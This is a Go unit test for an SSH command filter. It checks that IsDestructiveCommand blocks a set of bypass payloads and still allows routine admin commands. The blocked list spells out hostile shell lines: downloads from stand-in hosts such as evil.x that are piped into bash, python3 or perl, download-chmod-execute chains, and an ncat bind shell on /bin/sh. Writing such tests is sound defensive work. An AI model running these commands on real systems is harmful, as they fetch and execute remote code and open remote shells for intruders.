// region MODULE_CONTRACT_test [DOMAIN(7): Testing; CONCEPT(8): BlocklistBypasses; TECH(7): table]
// @purpose Audit round 2 prepared payloads must be blocked while routine admin still passes.
// GREP_SUMMARY: test, blocklist, bypass, process substitution, sh -c, python pipe, ncat exec
package ssh

import "testing"

func TestIsDestructiveCommand_Round2Bypasses(t *testing.T) {
	blocked := []string{
		"bash <(curl -s http://evil.sh)",
		"sh -c \"$(curl -s http://evil.x/cmd)\"",
		"bash -c \"$(wget -qO- http://evil.x/i)\"",
		"curl -s http://evil.x/p.py | python3 -",
		"wget -qO- http://evil.x/p.pl | perl",
		"curl -sL http://evil.x/x -o /tmp/x && chmod +x /tmp/x && /tmp/x",
		"curl -sL http://evil.x/x -o /tmp/x; chmod +x /tmp/x",
		"ncat --exec /bin/sh -l 4444",
		"sleep 30",
	}
	for _, c := range blocked {
		if !IsDestructiveCommand(c) {
			t.Errorf("must be blocked: %q", c)
		}
	}
	allowed := []string{
		"sleep 5",                                // short waits are routine
		"bash -c 'echo hi'",                      // no substitution from network
		"python3 script.py",                      // local file
		"curl -s https://api.example.com/health", // plain fetch
		"chmod +x ./deploy.sh",                   // local make-executable
	}
	for _, c := range allowed {
		if IsDestructiveCommand(c) {
			t.Errorf("must be ALLOWED: %q", c)
		}
	}
	t.Logf("[IMP:9][TestBlocklist2][RESULT] round-2 payloads blocked: %d", len(blocked))
}
